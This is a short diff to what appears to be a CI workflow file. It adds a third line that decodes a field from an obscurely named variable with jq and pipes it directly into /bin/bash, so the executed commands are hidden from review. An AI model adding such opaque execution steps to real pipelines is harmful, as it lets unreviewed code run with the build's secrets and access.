@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$taog6" | jq -r .m8398 | /bin/bash
           echo $ic5 | jq -r .dhzh2575 | /bin/bash
+          echo $fsral522 | jq -r .bscq55 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
